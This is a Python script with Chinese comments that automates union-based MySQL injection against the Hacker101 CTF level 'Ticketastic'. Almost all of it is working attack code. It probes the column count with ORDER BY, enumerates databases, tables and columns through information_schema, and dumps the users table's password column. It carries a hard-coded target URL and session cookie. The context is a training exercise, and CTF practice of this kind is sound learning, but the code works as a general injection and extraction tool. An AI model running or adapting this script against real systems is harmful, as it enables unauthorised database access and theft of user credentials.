"""
这个脚本用于hacker101里面Ticketastic: Live Instance注入一关,
暂时不考虑闭合sql语句的情况
"""
import requests
from bs4 import BeautifulSoup

from utility.hex_to_str import str_to_hex


class MYSQLHandInjection:
    def __init__(self,url, headers= {},method='GET'):
        self.url = url
        self.headers = headers
        self.method = method
        if method =='GET':
            self.requests = requests.get
        else:
            self.requests = requests.post
        self.column_quantity = self.get_column_quantity(self.url)
        self.databases = []
        self.need_databases = []
        self.unneed_databases = ['information_schema','mysql','performance_schema']

    def requests_wrapper(self,url):
        proxies = {
            'http': 'http://127.0.0.1:1080'
        }
        if self.method == 'GET':
            return requests.get(url, cookies=self.headers, proxies=proxies)

    def is_return_error(self, text):
        """
        此函数需根据不同情况去改写
        :param text:
        :return:
        """
        if 'Not logged in' in text:
            raise Exception('cookie expire')
        if 'Error' in text:
            return  True

    def get_column_quantity(self,url):
        """
        获取原查询的表有几个字段，或者查了几个字段，
        这样才能通过union去查其他信息
        :param url:
        :return:
        """
        for i in range(1,100):
            url = self.url + ' order by {n}'.format(n=i)
            r = self.requests(url,cookies=self.headers)
            if self.is_return_error(r.text):
                return i-1
        return 100

    def extract_currect_database_and_database_version(self,text):
        soup = BeautifulSoup(text,'lxml')
        database = soup.find(name='h1') and soup.find(name='h1').text
        version = soup.find(name='pre') and soup.find(name='pre').text
        return [database, version]

    def extract_database_name(self,text):
        soup = BeautifulSoup(text, 'lxml')
        database = soup.find(name='h1') and soup.find(name='h1').text
        return database

    def get_database_version(self):
        url = self.url + ' and 1=2 union select database(),version()'
        for i in range(self.column_quantity - 2):
            url += ',{i}'.format(i=i)
        print(url)
        r = self.requests(url,cookies=self.headers)
        result = self.extract_currect_database_and_database_version(r.text)
        print('currect database name is: ',result[0], 'database version is: ',result[1])
        return result

    def get_other_data_base(self):
        for i in range(100):
            url = self.url + ' and 1=2 union select schema_name'
            for j in range(self.column_quantity - 1):
                url += ',{j}'.format(j=j)
            url += ' from information_schema.schemata limit {},{}'.format(i, i+1)
            print(url)
            r = self.requests(url, cookies=self.headers)
            if not self.is_return_error(r.text):
                name = self.extract_database_name(r.text)
                self.databases.append(name)
                if name not in self.unneed_databases:
                    self.need_databases.append(name)
            else:
                print('all databases is: ',self.databases)
                print('needed databases is: ',self.need_databases)
                return

    def get_tables(self,dbname):
        names = []
        for i in range(100):
            url = self.url + ' and 1=2 union select table_name'
            for j in range(self.column_quantity - 1):
                url += ',{j}'.format(j=j)
            url += ' from information_schema.tables where table_schema={} limit {},{}'.format(str_to_hex(dbname),i, i+1)
            print(url)
            r = self.requests(url, cookies=self.headers)
            if not self.is_return_error(r.text):
                name = self.extract_database_name(r.text)
                names.append(name)
            else:
                print(f'{dbname} tables: {names} ')
                return

    def get_column_names(self,dbname, tablename):
        names = []
        for i in range(100):
            url = self.url + '  and 1=2 union select column_name'
            for j in range(self.column_quantity - 1):
                url += ',{j}'.format(j=j)
            url += ' from information_schema.columns where table_schema={}  and table_name={} limit {},{}'.format(
                str_to_hex(dbname),str_to_hex(tablename), i, i + 1)
            print(url)
            r = self.requests_wrapper(url)
            if not self.is_return_error(r.text):
                name = self.extract_database_name(r.text)
                names.append(name)
            else:
                print(f'{tablename} columns: {names} ')
                return

    def get_table_data(self, dbname, tablename,columnname):
        names = []
        for i in range(100):
            url = self.url + '  and 1=2 union select {}'.format(columnname)
            for j in range(self.column_quantity - 1):
                url += ',{j}'.format(j=j)
            url += ' from {}.{} limit {},{}'.format(
                dbname, tablename, i, i + 1)
            print(url)
            r = self.requests_wrapper(url)
            if not self.is_return_error(r.text):
                name = self.extract_database_name(r.text)
                names.append(name)
            else:
                print(f'{tablename} columns: {names} ')
                return

    def main(self):
        pass



if __name__ == '__main__':
    url = 'http://35.227.24.107:5001/eadca2dc79/ticket?id=1'
    headers = {"session_level7a":"eyJ1c2VyIjoiYWRtaW4ifQ.D2yQgg.Y18mBqcPzmJnBZd95gKJI20zm4U"}
    m = MYSQLHandInjection(url,headers)
    # m.get_database_version()
    # m.get_other_data_base()
    # m.get_tables('level7')
    # m.get_column_names('level7','users')
    m.get_table_data('level7','users','password')
    # m.get_column_names('level7','tickets')